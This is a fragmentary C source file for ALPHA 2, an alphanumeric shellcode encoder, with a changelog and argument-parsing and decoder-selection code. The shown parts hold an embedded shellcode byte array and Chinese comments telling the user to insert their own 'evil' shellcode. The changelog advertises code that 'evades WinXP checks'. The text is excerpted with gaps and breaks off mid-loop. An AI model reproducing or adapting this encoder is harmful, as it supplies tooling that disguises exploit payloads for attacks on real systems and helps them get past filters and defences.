#define VERSION_STRING "ALPHA 2: Zero-tolerance. (build 0.8)"
#define COPYRIGHT      "Copyright (C) 2003-2005 by Berend-Jan Wever."
/*
________________________________________________________________________________
  ...
  YS,  dSb    ,sY"'     Copyright (C) 2003-2005 by Berend-Jan Wever.
...
-- ALPHA 2 --
  ALPHA 2 v0.8:
      ...
      - New w32 SEH GetPC code evades WinXP checks.
      - Added "--nopslide:X" option.
  ALPHA 2 v0.7:
      - New command line options interface.
      - Expanded baseaddress sources with more "[esp+X]" options and
        "nops"
      - Added "--nocompress", "-n", "--help", "--version" and
          "--sources" options.
      - Online PHP version.
  ALPHA 2 v0.5:
      - Unicode or ASCII encoding,
      - Uppercase or mixed case output,
      - Online PHP version.
-- ALPHA 1 --
  ALPHA v0.4:
      - New command line options interface.
      - New Baseaddress source: w32 SEH GetPC code.
  ALPHA v0.3:
      - New Baseaddress sources: [esp+8], [esp+4], [esp-8].
      - Command line option for prefered characters to use in encoded
        shellcode.
  ALPHA v0.2:
      - First stable code, builds on linux, supports:
        + Uppercase ASCII encoded output,
        + Baseaddress sources: eax, ebx, ecx, edx, esi, edi, esp, ebp,
            [esp], [esp-4].
...
,0x63,0x2e,0x65,0x78,0x65,0x00};                          //注意shellcode的输入模式
...
int main(int argc, char* argv[], char* envp[]) {
  ...
  for (i=1; i<argc; i++) {
         if (STRCASECMP(argv[i], "--help") == 0) help();
    else if (STRCASECMP(argv[i], "--version") == 0) version();
    else if (STRCASECMP(argv[i], "--uppercase") == 0) uppercase = 1;
    else if (STRCASECMP(argv[i], "--unicode") == 0) unicode = 1;
    else if (STRCASECMP(argv[i], "--nocompress") == 0) nocompress = 1;
    else if (STRCASECMP(argv[i], "--sources") == 0) sources = 1;
    else if (STRCASECMP(argv[i], "--spaces") == 0) spaces = 1;
    else if (STRNCASECMP(argv[i], "--nopslide:", 11) == 0) nopslide = atoi(argv[i]+11);
    else if (STRCASECMP(argv[i], "-n") == 0) nonewline = 1;
    else if (baseaddress == NULL) baseaddress = argv[i];
    else {
      fprintf(stderr, "Error: more then one BASEADDRESS option: `%s' and `%s'\n"
                      "Try `alpha2 --help' for more information.\n",
                      baseaddress, argv[i]);
      exit(EXIT_FAILURE);
    }
  }
  ...
  if (sources) {
    printf("Encoding options:\n%s%s%sAvailable baseaddress sources:\n",
        uppercase ? "  - Uppercase\n" : "  - Mixed case\n",
        unicode ? "  - Unicode\n" : "",
        nopslide ? "  - With nopslide\n" : "");
    for (i=0,j=0; decoders[options][i].id != NULL; i++) {
      if (nopslide == 0 || decoders[options][i].nopslide != NULL) {
        printf("%s%s", (i==0 ? "  - " : (i%8 == 0 ? ",\n    " : ", ")), decoders[options][i].id);
        j++;
      }
    }
    printf(j==0 ? "  No options are available.\n" : "\n");
    exit(EXIT_SUCCESS);
  }
  // No baseaddress option ?
  if (baseaddress == NULL) {
    fprintf(stderr, "Error: missing BASEADDRESS options.\n"
                    "Try `alpha2 --help' for more information.\n");
    exit(EXIT_FAILURE);
  }
  ...
  for (i=0; STRCASECMP(baseaddress, decoders[options][i].id) != 0; i++) {
    if (decoders[options][i+1].id == NULL) {
      fprintf(stderr, "Error: unrecognized baseaddress option `%s'\n"
                      "Try `alpha2 %s%s--sources' for a list of BASEADDRESS options.\n",
                      baseaddress, uppercase ? "--uppercase " : "", unicode ? "--unicode " : "");
      exit(EXIT_FAILURE);
    }
  }
  // optionally output nopslide
  if (nopslide) {
    if (decoders[options][i].nopslide == NULL) {
      fprintf(stderr, "Error: baseaddress option `%s' does not support nopslides.\n",
                      baseaddress);
      exit(EXIT_FAILURE);
    }
    do {
      j = rand() % strlen(decoders[options][i].nopslide);
      printf("%c", decoders[options][i].nopslide[j]);
    } while (--nopslide);
  }
...
//printf("%s %d\n",evil,sizeof(evil));
  for (k=0;k<sizeof(evil);k++)//evil你自己的shllcode，用的话需修改源码
 {
    input=evil[k];
